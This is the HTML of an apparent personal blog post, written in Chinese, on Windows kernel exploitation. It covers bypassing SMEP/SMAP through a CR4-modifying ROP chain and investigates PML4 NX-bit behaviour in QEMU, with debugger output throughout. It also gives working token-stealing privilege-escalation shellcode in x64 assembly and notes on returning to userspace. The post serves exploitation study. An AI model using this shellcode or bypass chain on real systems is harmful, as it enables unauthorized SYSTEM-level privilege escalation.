@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="Bypass SMEP &amp;&amp; SMAPCR4寄存器：(第0位开始算起)20位：SMEP21位：SMAP和Linux kernel相同，需要一条chain来修改CR4寄存器 123pop rcx; retcr4_valuemov cr4, rcx; ret Windows中CR4寄存器修改可能会被Check到，产生： 1Bug Check 0x139: KERNEL_SECURITY">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode">
+<meta property="og:url" content="http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="Bypass SMEP &amp;&amp; SMAPCR4寄存器：(第0位开始算起)20位：SMEP21位：SMAP和Linux kernel相同，需要一条chain来修改CR4寄存器 123pop rcx; retcr4_valuemov cr4, rcx; ret Windows中CR4寄存器修改可能会被Check到，产生： 1Bug Check 0x139: KERNEL_SECURITY">
+<meta property="article:published_time" content="2020-06-11T12:30:49.000Z">
+<meta property="article:modified_time" content="2020-06-11T12:32:26.752Z">
+<meta property="article:author" content="Kirin">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/06/11/Windows-Kernel-Debug-Environment/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&text=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&title=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&is_video=false&description=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode&body=Check out this article: http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&title=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&title=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&title=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&title=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&name=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-SMEP-amp-amp-SMAP"><span class="toc-number">1.</span> <span class="toc-text">Bypass SMEP &amp;&amp; SMAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NX-bit-amp-amp-PML4"><span class="toc-number">2.</span> <span class="toc-text">NX-bit &amp;&amp; PML4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Run-Shellcode"><span class="toc-number">3.</span> <span class="toc-text">Run Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-to-Userspace-Safely"><span class="toc-number">4.</span> <span class="toc-text">Return to Userspace Safely</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2020-06-11T12:30:49.000Z" itemprop="datePublished">2020-06-11</time>
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Bypass-SMEP-amp-amp-SMAP"><a href="#Bypass-SMEP-amp-amp-SMAP" class="headerlink" title="Bypass SMEP &amp;&amp; SMAP"></a>Bypass SMEP &amp;&amp; SMAP</h2><p>CR4寄存器：(第0位开始算起)<br>20位：SMEP<br>21位：SMAP<br>和Linux kernel相同，需要一条chain来修改CR4寄存器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rcx; ret</span><br><span class="line">cr4_value</span><br><span class="line">mov cr4, rcx; ret</span><br></pre></td></tr></table></figure>
+<p>Windows中CR4寄存器修改可能会被Check到，产生：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bug Check 0x139: KERNEL_SECURITY_CHECK_FAILURE</span><br></pre></td></tr></table></figure>
+<p>所以最好根据对应环境下的CR4的值，只关闭SMEP、SMAP对应bit即可<br><strong>不过在特定环境下，仅仅关闭SMEP、SMAP是不够的</strong></p>
+<h2 id="NX-bit-amp-amp-PML4"><a href="#NX-bit-amp-amp-PML4" class="headerlink" title="NX-bit &amp;&amp; PML4"></a>NX-bit &amp;&amp; PML4</h2><p>起源于一次Debug：<br>在Vmware环境下修改CR4来关闭SMEP和SMAP后可以成功跳入用户空间的Shellcode<br>但是在QEMU中却出现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bug Check 0xFC: ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY</span><br></pre></td></tr></table></figure>
+<p>QEMU选项：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-enable-kvm -cpu Broadwell,+smep,+smap,+pcid</span><br></pre></td></tr></table></figure>
+<p>可是创建空间使用的是:PAGE_EXECUTE_READWRITE<br>通过循环调用MiGetPTEaddress可以获得VirtualAddress的PTE-&gt;PDE-&gt;PDPTE-&gt;PML4E</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; uf nt!MiGetPTEaddress</span><br><span class="line">nt!MiGetPteAddress:</span><br><span class="line">fffff802&#96;25ad8dc8 48c1e909        shr     rcx,9</span><br><span class="line">fffff802&#96;25ad8dcc 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h</span><br><span class="line">fffff802&#96;25ad8dd6 4823c8          and     rcx,rax</span><br><span class="line">fffff802&#96;25ad8dd9 48b8000000000092ffff mov rax,0FFFF920000000000h</span><br><span class="line">fffff802&#96;25ad8de3 4803c1          add     rax,rcx</span><br><span class="line">fffff802&#96;25ad8de6 c3              ret</span><br></pre></td></tr></table></figure>
+<p>PTE、PDE、PDPTE对应位置都没有问题，但是看到对应的PML4表项：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dq ffffae572b95c000</span><br><span class="line">ffffae57&#96;2b95c000   8a000000&#96;ad029867    00000000&#96;00000000</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>可以看到对应最高位NX-bit为1，所以直接跳转会不可执行，但是vmware环境下对应最高为:0a000000……，最高位NX-bit为0，在关闭SMEP、SMAP后可以直接执行<br><strong>这里占坑，只能大致根据自己的debug和现有资料猜测实现的原理：</strong><br>其实这四个表项的NX-bit，经过调试，都会起作用，所以这里的PML4表项的NX-bit猜测是在进入内核态才会设置的<br>在QEMU中使用gdbserver调试，分别断在用户态和内核态，可以看到，在用户态这个表项对应位置的NX-bit为0，在内核态为1<br>所以猜测这是最开始硬件实现的一种SMEP机制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里有类似的说明，不过情况不一样，但是有助于理解：</span><br><span class="line">https:&#x2F;&#x2F;ricklarabee.blogspot.com&#x2F;2017&#x2F;01&#x2F;virtual-memory-page-tables-and-one-bit.html</span><br><span class="line">http:&#x2F;&#x2F;hypervsir.blogspot.com&#x2F;2014&#x2F;11&#x2F;implement-software-based-smep-with-non.html</span><br></pre></td></tr></table></figure>
+<p>经过调试可以找到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">KVASCODE:0000000140352DC1                 mov     cr3, rbp</span><br><span class="line">KVASCODE:0000000140352DC4</span><br><span class="line">KVASCODE:0000000140352DC4 loc_140352DC4:                          ; CODE XREF: sub_140352D80+C↑j</span><br><span class="line">KVASCODE:0000000140352DC4                 mov     rbp, r9</span><br><span class="line">KVASCODE:0000000140352DC7                 bt      esp, 1</span><br><span class="line">KVASCODE:0000000140352DCB                 jb      short loc_140352DD6</span><br><span class="line">KVASCODE:0000000140352DCD                 verw    word ptr gs:702Ah</span><br><span class="line">KVASCODE:0000000140352DD6</span><br><span class="line">KVASCODE:0000000140352DD6 loc_140352DD6:                          ; CODE XREF: sub_140352D80+4B↑j</span><br><span class="line">KVASCODE:0000000140352DD6                 mov     rsp, r8</span><br><span class="line">KVASCODE:0000000140352DD9                 swapgs</span><br><span class="line">KVASCODE:0000000140352DDC                 sysret</span><br><span class="line">KVASCODE:0000000140352DDF                 rent</span><br></pre></td></tr></table></figure>
+<p>在即将返回用户态，<code>mov     cr3, rbp</code>时，会将NX-bit恢复，在一些文档中看到对cr3的mov操作会产生side effect，但是没有看到对PML4的NX-bit的影响<br>猜测：当上下文切换时(syscall/sysret/cr3切换)，硬件会将用户空间的PML4E的NX-bit置1来实现SMEP保护<br><strong>Bypass：如果对应的环境下有这个机制，找到一条chain来修改对应的表项，关闭NX即可</strong></p>
+<h2 id="Run-Shellcode"><a href="#Run-Shellcode" class="headerlink" title="Run Shellcode"></a>Run Shellcode</h2><p>Windows Kernel下提权的Shellcode和Linux Kernel下提权的原理类似，Linux Kernel下有cred结构体标识进程权限，Windows Kernel下则使用Token标识进程权限。<br>内核态中，每个进程都有自己对应的_EPROCESS结构体:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt nt!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x2e0 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x2e8 UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +0x2f0 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">   +0x360 Token            : _EX_FAST_REF</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>其中UniqueProcessId标识着这个进程ID，ActiveProcessLinks作为链表指向另一个进程的ActiveProcessLinks：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _LIST_ENTRY</span><br><span class="line">nt!_LIST_ENTRY</span><br><span class="line">   +0x000 Flink            : Ptr64 _LIST_ENTRY</span><br><span class="line">   +0x008 Blink            : Ptr64 _LIST_ENTRY</span><br></pre></td></tr></table></figure>
+<p>所以只需要把当前进程的_EPROCESS的Token修改为System进程的Token即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !process 0 0 System</span><br><span class="line">PROCESS ffff9705dae6f2c0</span><br><span class="line">    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000</span><br><span class="line">    DirBase: 001aa000  ObjectTable: ffffe58617e05e00  HandleCount: 2381.</span><br><span class="line">    Image: System</span><br></pre></td></tr></table></figure>
+<p>System对应的 UniqueProcessId 为 4<br>还需要找到当前进程的_EPROCESS：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; uf nt!PsGetCurrentProcess</span><br><span class="line">nt!PsGetCurrentProcess:</span><br><span class="line">fffff802&#96;25a85de0 65488b042588010000 mov   rax,qword ptr gs:[188h]</span><br><span class="line">fffff802&#96;25a85de9 488b80b8000000  mov     rax,qword ptr [rax+0B8h]</span><br><span class="line">fffff802&#96;25a85df0 c3              ret</span><br></pre></td></tr></table></figure>
+<p>通过这两条指令就可以获得当前进程的_EPROCESS<br>不过实际上gs:[188h]处是当前对应的_ETHREAD(_ETHREAD开始位置展开是_KTHREAD):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt nt!_KTHREAD poi(gs:188h)</span><br><span class="line">......</span><br><span class="line">   +0x098 ApcState         : _KAPC_STATE</span><br><span class="line">   +0x098 ApcStateFill     : [43]  &quot;???&quot;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">   +0x220 Process          : 0xffff9705&#96;e4bdd4c0 _KPROCESS</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>对应0xB8偏移位置是ApcState.Process:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dx -id 0,0,ffff9705e4bdd4c0 -r1 (*((ntkrnlmp!_KAPC_STATE *)0xffff9705e229b2d8))</span><br><span class="line">(*((ntkrnlmp!_KAPC_STATE *)0xffff9705e229b2d8))                 [Type: _KAPC_STATE]</span><br><span class="line">    [+0x000] ApcListHead      [Type: _LIST_ENTRY [2]]</span><br><span class="line">    [+0x020] Process          : 0x0 [Type: _KPROCESS *]</span><br><span class="line">    [+0x028] InProgressFlags  : 0x0 [Type: unsigned char]</span><br></pre></td></tr></table></figure>
+<p>简单查了一下资料：这两个位置区别：如果当前线程attach到别的进程，ApcState.Process会改变，但是0x220处的Process不会改变，所以PsGetCurrentProcess获得的_EPROCESS更加准确，不过其实正常exploit编写，这地方实际指向同一个_EPROCESS，所以没太大影响(如果因为这里发生Crash，可以修改尝试一下)(<strong>占坑，没太理清这里会影响的与EXP相关的程序流</strong>)<br><strong>Shellcode：</strong><br>首先获得当前_EPROCESS, 而后利用ActiveProcessLinks不断搜索，判断UniqueProcessId是否为4，将UniqueProcessId为4(System)对应的Token覆盖原来的Token，即可完成提权,针对不同版本可能需要修改偏移</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">	push rax</span><br><span class="line">	push rbx</span><br><span class="line">	push rcx</span><br><span class="line">	mov rax,gs:0x188</span><br><span class="line">	mov rax,qword ptr [rax+0xb8]</span><br><span class="line">	lea rbx,qword ptr [rax+0x360]</span><br><span class="line">loop:</span><br><span class="line">	mov rax,qword ptr [rax+0x2f0]</span><br><span class="line">	sub rax,0x2f0</span><br><span class="line">	mov rcx,qword ptr [rax+0x2e8]</span><br><span class="line">	cmp rcx,4</span><br><span class="line">	jnz loop</span><br><span class="line"></span><br><span class="line">	mov rcx,qword ptr [rax+0x360]</span><br><span class="line">	mov qword ptr [rbx],rcx</span><br><span class="line">	pop rcx</span><br><span class="line">	pop rbx</span><br><span class="line">	pop rax</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
+<p>不过运行时发生了Crash：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal System Error: 0x00000001</span><br></pre></td></tr></table></figure>
+<p>Analyze:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !analyze -v</span><br><span class="line">*******************************************************************************</span><br><span class="line">*                                                                             *</span><br><span class="line">*                        Bugcheck Analysis                                    *</span><br><span class="line">*                                                                             *</span><br><span class="line">*******************************************************************************</span><br><span class="line"></span><br><span class="line">APC_INDEX_MISMATCH (1)</span><br><span class="line">This is a kernel internal error. The most common reason to see this</span><br><span class="line">bugcheck is when a filesystem or a driver has a mismatched number of</span><br><span class="line">calls to disable and re-enable APCs. The key data item is the</span><br><span class="line">Thread-&gt;CombinedApcDisable field. This consists of two separate 16-bit</span><br><span class="line">fields, the SpecialApcDisable and the KernelApcDisable. A negative value</span><br><span class="line">of either indicates that a driver has disabled special or normal APCs</span><br><span class="line">(respectively) without re-enabling them; a positive value indicates that</span><br><span class="line">a driver has enabled special or normal APCs (respectively) too many times.</span><br><span class="line">Arguments:</span><br><span class="line">Arg1: 00007ffbf9ddc1a4, Address of system call function or worker routine</span><br><span class="line">Arg2: 0000000000000000, Thread-&gt;ApcStateIndex</span><br><span class="line">Arg3: 000000000000ffff, (Thread-&gt;SpecialApcDisable &lt;&lt; 16) | Thread-&gt;KernelApcDisable</span><br><span class="line">Arg4: ffff8d8eb3fbfb00, Call type (0 - system call, 1 - worker routine)</span><br></pre></td></tr></table></figure>
+<p><strong>占坑，这里没太明白这个机制，根据官方的说明，需要Modify一下Thread-&gt;KernelApcDisable</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt nt!_KTHREAD</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">   +0x1e4 KernelApcDisable : Int2B</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p><strong>在Shellcode中置KernelApcDisable为0即可(有些环境下不需要)</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">	push rax</span><br><span class="line">	push rbx</span><br><span class="line">	push rcx</span><br><span class="line">	mov rax,gs:0x188</span><br><span class="line">	mov word ptr [rax+0x1e4],0 ;Added to Modify Thread-&gt;KernelApcDisable</span><br><span class="line">	mov rax,qword ptr [rax+0xb8]</span><br><span class="line">	lea rbx,qword ptr [rax+0x360]</span><br><span class="line">loop:</span><br><span class="line">	mov rax,qword ptr [rax+0x2f0]</span><br><span class="line">	sub rax,0x2f0</span><br><span class="line">	mov rcx,qword ptr [rax+0x2e8]</span><br><span class="line">	cmp rcx,4</span><br><span class="line">	jnz loop</span><br><span class="line"></span><br><span class="line">	mov rcx,qword ptr [rax+0x360]</span><br><span class="line">	mov qword ptr [rbx],rcx</span><br><span class="line">	pop rcx</span><br><span class="line">	pop rbx</span><br><span class="line">	pop rax</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
+<p>最后通过pwntools的asm模块转为Bytes或者直接内嵌asm即可</p>
+<h2 id="Return-to-Userspace-Safely"><a href="#Return-to-Userspace-Safely" class="headerlink" title="Return to Userspace Safely"></a>Return to Userspace Safely</h2><p>提权后需要安全地返回用户空间<br>只能视情况而定，主要的思路：</p>
+<ul>
+<li>构造好寄存器环境后sysret</li>
+<li>恢复rbp栈帧，而后ret到未破坏程序流时正常的执行位置(一般在KiSystemServiceExit)</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-SMEP-amp-amp-SMAP"><span class="toc-number">1.</span> <span class="toc-text">Bypass SMEP &amp;&amp; SMAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NX-bit-amp-amp-PML4"><span class="toc-number">2.</span> <span class="toc-text">NX-bit &amp;&amp; PML4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Run-Shellcode"><span class="toc-number">3.</span> <span class="toc-text">Run Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-to-Userspace-Safely"><span class="toc-number">4.</span> <span class="toc-text">Return to Userspace Safely</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&text=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&title=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&is_video=false&description=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode&body=Check out this article: http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&title=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&title=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&title=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&title=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
